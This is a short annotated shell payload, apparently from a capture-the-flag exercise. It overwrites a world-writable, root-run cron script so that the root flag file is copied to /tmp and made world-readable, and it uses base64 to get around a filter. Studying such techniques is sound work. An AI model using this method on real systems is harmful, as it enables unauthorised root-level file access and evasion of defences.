# Payload written into /opt/healthcheck.sh
# /opt/healthcheck.sh is owned by root but world-writable (-rwxrwxrwx) and is
# executed by cron as root every minute (also at +10/+20/+30/+40/+50s).
#
# Installed via base64 to avoid shell-quoting pain while our filter is active:
#   echo IyEv...(b64) > /tmp/b64
#   base64 -d /tmp/b64 > /opt/healthcheck.sh
#
#!/bin/sh
cp /root/root.txt /tmp/rootflag.txt
chmod 666 /tmp/rootflag.txt